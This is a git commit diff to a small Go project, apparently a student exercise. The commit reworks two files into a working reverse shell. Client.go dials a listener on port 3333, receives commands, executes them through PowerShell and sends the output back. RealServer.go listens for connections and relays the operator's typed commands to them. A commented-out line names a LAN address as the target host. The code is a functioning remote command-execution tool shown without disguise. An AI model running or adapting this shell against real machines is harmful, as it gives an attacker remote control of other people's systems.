930da4b8171a285533aad43d331f107297089cdf
mco9734 <mco9734@rit.edu>
2022-03-29 19:02:10 -0400

    changes

--- client/RealServer.go
+++ client/RealServer.go
@@ -8,8 +8,42 @@ import (
 	"strings"
 )
 
+const (
+	CONN_HOST = "localhost"
+	CONN_PORT = "3333"
+	CONN_TYPE = "tcp"
+)
+
 func main() {
+	// Listen for incoming connections.
+	l, err := net.Listen(CONN_TYPE, CONN_HOST+":"+CONN_PORT)
+	if err != nil {
+		fmt.Println("Error listening:", err.Error())
+		os.Exit(1)
+	}
+	// Close the listener when the application closes.
+	defer l.Close()
+	fmt.Println("Listening on " + CONN_HOST + ":" + CONN_PORT)
 	for {
+		// Listen for an incoming connection.
+		conn, err := l.Accept()
+		if err != nil {
+			fmt.Println("Error accepting: ", err.Error())
+			os.Exit(1)
+		}
+		// Handle connections in a new goroutine.
+		go handleRequest(conn)
+	}
+}
+
+func handleRequest(conn net.Conn) {
+	// reader := bufio.NewReader(os.Stdin)
+	// fmt.Print("Enter IP: ")
+	// IP, _ := reader.ReadString('\n')
+	// stripIP := strings.TrimSpace(IP)
+
+	for {
+
 		reader := bufio.NewReader(os.Stdin)
 		fmt.Print("Enter text: ")
 		strEcho, _ := reader.ReadString('\n')
@@ -21,25 +55,25 @@ func main() {
 			return
 		}
 
-		servAddr := "localhost:3333"
-		tcpAddr, err := net.ResolveTCPAddr("tcp", servAddr)
-		if err != nil {
-			println("ResolveTCPAddr failed:", err.Error())
-			os.Exit(1)
-		}
+		// servAddr := stripIP + ":3333"
+		// tcpAddr, err := net.ResolveTCPAddr("tcp", servAddr)
+		// if err != nil {
+		// 	println("ResolveTCPAddr failed:", err.Error())
+		// 	os.Exit(1)
+		// }
 
-		conn, err := net.DialTCP("tcp", nil, tcpAddr)
-		if err != nil {
-			println("Dial failed:", err.Error())
-			os.Exit(1)
-		}
+		// conn, err := net.DialTCP("tcp", nil, tcpAddr)
+		// if err != nil {
+		// 	println("Dial failed:", err.Error())
+		// 	os.Exit(1)
+		// }
 
 		if buf[0] == 'c' && buf[1] == 'd' {
 			fmt.Print("Enter full directory: ")
 			directory, _ := reader.ReadString('\n')
 			strEcho = "cd " + directory
 		}
-		_, err = conn.Write([]byte(strEcho))
+		_, err := conn.Write([]byte(strEcho))
 		if err != nil {
 			println("Write to server failed:", err.Error())
 		}
@@ -55,7 +89,7 @@ func main() {
 
 		println("reply from server=", string(reply))
 
-		conn.Close()
+		// conn.Close()
 	}
 
 }
--- main/Client.go
+++ main/Client.go
@@ -8,71 +8,85 @@ import (
 	"strings"
 )
 
-const (
-	CONN_HOST = "localhost"
-	CONN_PORT = "3333"
-	CONN_TYPE = "tcp"
-)
+// const (
+// 	CONN_HOST = "192.168.206.97"
+// 	CONN_PORT = "3333"
+// 	CONN_TYPE = "tcp"
+// )
 
-func main() {
-	// Listen for incoming connections.
-	l, err := net.Listen(CONN_TYPE, CONN_HOST+":"+CONN_PORT)
-	if err != nil {
-		fmt.Println("Error listening:", err.Error())
-		os.Exit(1)
-	}
-	// Close the listener when the application closes.
-	defer l.Close()
-	fmt.Println("Listening on " + CONN_HOST + ":" + CONN_PORT)
-	for {
-		// Listen for an incoming connection.
-		conn, err := l.Accept()
-		if err != nil {
-			fmt.Println("Error accepting: ", err.Error())
-			os.Exit(1)
-		}
-		// Handle connections in a new goroutine.
-		go handleRequest(conn)
-	}
-}
+// func main() {
+// 	// Listen for incoming connections.
+// 	l, err := net.Listen(CONN_TYPE, CONN_HOST+":"+CONN_PORT)
+// 	if err != nil {
+// 		fmt.Println("Error listening:", err.Error())
+// 		os.Exit(1)
+// 	}
+// 	// Close the listener when the application closes.
+// 	defer l.Close()
+// 	fmt.Println("Listening on " + CONN_HOST + ":" + CONN_PORT)
+// 	for {
+// 		// Listen for an incoming connection.
+// 		conn, err := l.Accept()
+// 		if err != nil {
+// 			fmt.Println("Error accepting: ", err.Error())
+// 			os.Exit(1)
+// 		}
+// 		// Handle connections in a new goroutine.
+// 		go handleRequest(conn)
+// 	}
+// }
 
 // Handles incoming requests.
-func handleRequest(conn net.Conn) {
-	// Make a buffer to hold incoming data.
-	buf := make([]byte, 8192)
-	// Read the incoming connection into the buffer.
-	_, err := conn.Read(buf)
+func main() {
+	servAddr := "localhost:3333"
+	tcpAddr, err := net.ResolveTCPAddr("tcp", servAddr)
 	if err != nil {
-		fmt.Println("Error reading:", err.Error())
+		println("ResolveTCPAddr failed:", err.Error())
+		os.Exit(1)
 	}
-	bufString := ""
-	for _, v := range buf {
-		if v != 0 {
-			bufString = bufString + string(v)
-		}
+
+	conn, err := net.DialTCP("tcp", nil, tcpAddr)
+	if err != nil {
+		println("Dial failed:", err.Error())
+		os.Exit(1)
 	}
-	if buf[0] == 'c' && buf[1] == 'd' {
-		splits := strings.Split(bufString, " ")
-		// fmt.Println(splits[1])
-		dir := strings.TrimSpace(splits[1])
-		err := os.Chdir(dir)
+	for {
+		// Make a buffer to hold incoming data.
+		buf := make([]byte, 8192)
+		// Read the incoming connection into the buffer.
+		_, err = conn.Read(buf)
 		if err != nil {
-			fmt.Println("Error changing directory", err.Error())
-			conn.Write([]byte("Error changing directory " + err.Error()))
+			fmt.Println("Error reading:", err.Error())
 		}
-		wd, _ := os.Getwd()
-		conn.Write([]byte("directory changed to " + wd))
-	} else {
-		cmd := exec.Command("powershell", bufString)
-		output, err := cmd.CombinedOutput()
-		if err != nil {
-			fmt.Println(fmt.Sprint(err) + ": " + string(output))
-			conn.Write([]byte("error"))
-			return
+		bufString := ""
+		for _, v := range buf {
+			if v != 0 {
+				bufString = bufString + string(v)
+			}
 		}
-		fmt.Println(string(output))
-		conn.Write(output)
+		if buf[0] == 'c' && buf[1] == 'd' {
+			splits := strings.Split(bufString, " ")
+			// fmt.Println(splits[1])
+			dir := strings.TrimSpace(splits[1])
+			err := os.Chdir(dir)
+			if err != nil {
+				fmt.Println("Error changing directory", err.Error())
+				conn.Write([]byte("Error changing directory " + err.Error()))
+			}
+			wd, _ := os.Getwd()
+			conn.Write([]byte("directory changed to " + wd))
+		} else {
+			cmd := exec.Command("powershell", bufString)
+			output, err := cmd.CombinedOutput()
+			if err != nil {
+				fmt.Println(fmt.Sprint(err) + ": " + string(output))
+				conn.Write([]byte("error"))
+				return
+			}
+			fmt.Println(string(output))
+			conn.Write(output)
+		}
 	}
 	// Close the connection when you're done with it.
-	conn.Close()
+	// conn.Close()
 }
